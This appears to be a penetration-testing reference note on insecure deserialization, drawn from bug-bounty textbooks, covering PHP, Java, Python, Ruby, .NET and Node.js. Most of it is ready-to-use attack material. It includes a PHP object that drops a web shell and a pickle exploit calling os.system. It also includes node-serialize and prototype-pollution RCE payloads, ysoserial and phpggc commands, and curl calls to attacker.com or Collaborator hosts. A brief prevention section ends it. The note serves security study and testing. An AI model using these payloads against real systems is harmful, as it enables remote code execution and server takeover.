# Insecure Deserialization
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
Attacker supplies a serialized object that, when deserialized, executes arbitrary code via "gadget chains" — sequences of existing code that chain together to achieve malicious effects.

## Finding Deserialization Points

### Where to Look
1. **Cookies**: Base64-encoded blobs starting with `rO0` (Java) or containing `O:` (PHP)
2. **Request bodies**: POST data with serialized objects
3. **ViewState** (`__VIEWSTATE` parameter in ASP.NET)
4. **Custom headers**: Any header with encoded data
5. **Session objects**: Stored and deserialized server-side
6. **File uploads**: Deserializing uploaded files

### Detection
```bash
# Look for Java serialized bytes
echo "rO0ABXNyAA..." | base64 -d | xxd | head -1
# Should show: ac ed 00 05

# PHP serialized object signature
echo 'O:4:"User":1:{...}' | head -c 2  # "O:" = object

# Java magic bytes:
# Hex: AC ED 00 05
# Base64 start: rO0AB
```

---

## PHP Deserialization

### How PHP Serialization Works
```php
class User {
    public $username;
    public $isAdmin = false;
}
$user = new User();
$user->username = "alice";
echo serialize($user);
// O:4:"User":2:{s:8:"username";s:5:"alice";s:7:"isAdmin";b:0;}
```

### Magic Methods (POP Chain Entry Points)
```
__wakeup()   → Called automatically on unserialize()
__destruct() → Called when object is garbage collected
__toString() → Called when object used as string
__invoke()   → Called when object used as function
__call()     → Called on undefined method call
```

### Exploit: PHP Object Injection with RCE
```php
// Vulnerable code somewhere in app:
class UserFunction {
    private $hook;
    function __wakeup() {
        eval($this->hook);  // Executes arbitrary PHP on deserialization!
    }
}

// Attacker creates malicious serialized object:
class Logger {
    private $log_file = '/var/www/html/shell.php';
    private $data = '<?php system($_GET["cmd"]); ?>';
    function __destruct() {
        file_put_contents($this->log_file, $this->data);
    }
}
print urlencode(serialize(new Logger()));
```

### Cookie Exploitation
```
# Find serialized object in cookie:
Cookie: user_prefs=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22admin%22%3Bb%3A0%3B%7D

# Decode: O:4:"User":1:{s:5:"admin";b:0;}
# Modify: O:4:"User":1:{s:5:"admin";b:1;}
# Re-encode and replace cookie
```

### PHPGGC — PHP Gadget Chain Generator
```bash
phpggc Laravel/RCE1 system id        # Generate gadget chain for Laravel
phpggc Symfony/RCE1 exec whoami     # For Symfony
phpggc --list                        # List all available chains
```

---

## Java Deserialization

### Identifying Java Serialized Objects
```
Magic bytes (hex): AC ED 00 05
Base64 encoded:    rO0ABXsr...
```

### ysoserial — Java Gadget Chains
```bash
# List available gadget chains
java -jar ysoserial.jar --help

# Generate payload for Commons Collections 1
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com' | base64

# URLDNS (just DNS, doesn't need gadget chain — use for detection)
java -jar ysoserial.jar URLDNS "http://attacker.burpcollaborator.net" | base64

# Try multiple chains:
for chain in CommonsCollections1 CommonsCollections3 CommonsCollections6 Spring1 Spring2 Hibernate1; do
  java -jar ysoserial.jar $chain 'curl http://YOUR_COLLAB.burpcollaborator.net' | base64 -w0
done

# Common vulnerable libraries:
# Apache Commons Collections 3.1/4.0
# Spring Framework
# Apache Groovy
# JBoss/WebLogic/Jenkins specific gadgets
```

### Testing Approach
```bash
# Step 1: Send URLDNS payload first (no code execution, just DNS)
java -jar ysoserial.jar URLDNS "http://$(date +%s).your.burpcollaborator.net" | base64 -w0
# If DNS hit received → target is deserializing objects

# Step 2: Try RCE payloads
for chain in CommonsCollections1 CommonsCollections3 CommonsCollections5 CommonsCollections6; do
  java -jar ysoserial.jar $chain 'curl http://YOUR_COLLAB.burpcollaborator.net' | base64 -w0
done
```

---

## Python Deserialization

### Pickle — Arbitrary Code Execution
```python
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/pwned',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Send as cookie or parameter
```

### YAML (PyYAML) — Unsafe Load
```python
# Vulnerable
import yaml
data = yaml.load(user_input)  # Use yaml.safe_load() instead!

# Exploit payload:
!!python/object/apply:subprocess.call
  - [curl, http://attacker.com]
```

---

## Ruby Deserialization

```ruby
# Vulnerable code
data = Marshal.load(Base64.decode64(params[:obj]))

# YAML deserialization gadget:
require 'yaml'
# Use gadget chain tools for Ruby (e.g., Ruby Exploit Serialization Kit)
```

---

## .NET Deserialization

### BinaryFormatter (Dangerous)
```
# Gadget chain tool: ysoserial.net (YSoSerialNet)
# Target classes: ObjectDataProvider, WindowsIdentity

ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "ping attacker.com" -o base64
```

### ViewState Without MAC Validation
```
# __VIEWSTATE is not MAC validated → forge serialized ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "whoami" --generator=XXXX --viewstateuserkey=YYYY
```

---

## Node.js Prototype Pollution via Deserialization

```javascript
// node-serialize package vulnerable:
var serialize = require('node-serialize');
var data = serialize.unserialize(userInput);

// IIFE payload:
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('curl http://attacker.com')}()"}

// Prototype pollution gadget (via merge of JSON with __proto__):
// Input: {"__proto__": {"admin": true}}
// Or: {"constructor": {"prototype": {"admin": true}}}

// outputFunctionName gadget in some Node.js template engines:
{"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id>/tmp/out');var __tmp2"}}
```

---

## Severity
- **Critical**: Any working deserialization gadget chain = RCE

## Prevention (for Code Review)
```php
// PHP: Never unserialize user input
// Use JSON instead of serialize()
$data = json_decode($_COOKIE['data'], true);

// Java: Use ObjectInputFilter to allowlist classes
// Python: Never use pickle on untrusted data, use json
// Ruby: Never use Marshal.load on untrusted data, use JSON
// Node.js: Never call eval() on input, avoid unsafe merge patterns
```
